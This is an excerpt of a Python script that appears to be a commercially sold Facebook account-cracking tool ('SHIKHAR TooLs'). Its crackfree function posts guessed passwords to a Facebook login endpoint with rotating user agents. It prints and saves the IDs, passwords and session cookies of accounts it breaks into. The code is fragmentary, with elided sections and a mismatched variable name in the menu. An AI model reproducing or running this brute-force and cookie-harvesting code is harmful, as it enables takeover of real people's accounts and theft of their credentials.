...
print(logo)
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days Free \033[0;92m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 800 Rs \033[0;92m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m SHIKHAR TooLs Daily Update)✅ \033[0;92m")
...
def menu():
    ...
    print('\033[0;97m=================')
    AHIKHAR = input('\x1b[1;92m[+] CHOOSE: ')
    if SHIKHAR in ['111']:
        login()
        dump_massal()
    elif SHIKHAR in ['1']:
        crack_file()
    elif SHIKHAR in ['2','02']:
        os.system('xdg-open https://wa.me/+8801608843956')
        os.system("python nono.py")
    elif SHIKHAR in ['3','03']:
        result()
    elif SHIKHAR in ['0']:
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[SHIKHAR-M2] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[SHIKHAR-Cp] {idf} • {pw}')
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[SHIKHAR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
                os.system('espeak -a 300 " SHIKHAR,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
